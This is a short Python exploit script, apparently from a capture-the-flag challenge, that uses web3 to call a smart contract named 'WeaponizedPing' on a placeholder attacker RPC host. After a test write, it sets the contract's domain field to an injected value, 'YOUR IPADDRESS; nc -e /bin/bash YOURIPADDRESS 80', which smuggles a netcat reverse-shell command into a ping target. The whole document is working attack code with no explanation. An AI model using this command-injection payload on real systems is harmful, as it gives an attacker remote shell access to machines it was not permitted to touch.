from web3 import Web3
import json

with open('address.txt') as fh:
    address = fh.read().replace('\n','')

with open('WeaponizedPing.json') as fh:
    contractData = json.load(fh)

rpcURL = 'http://ATTACKIPADDRESS:PORT/'
w3 = Web3(Web3.HTTPProvider(rpcURL))
w3.eth.defaultAccount = w3.eth.accounts[0]

contract = w3.eth.contract(address = address, abi = contractData['abi'])

print('Current Domain: ' + contract.functions.getDomain().call())
w3.eth.waitForTransactionReceipt(contract.functions.setDomain('YOURIPADDRESS').transact())
print('New Domain: ' + contract.functions.getDomain().call())

#IF THE SCRIPT WORKS SO FAR REPLACE THE BOTTOM TO THE TOP
domain = 'YOUR IPADDRESS; nc -e /bin/bash YOURIPADDRESS 80'
print('Current Domain: ' + contract.functions.getDomain().call())
w3.eth.waitForTransactionReceipt(contract.functions.setDomain(domain).transact())
print('New Domain: ' + contract.functions.getDomain().call())
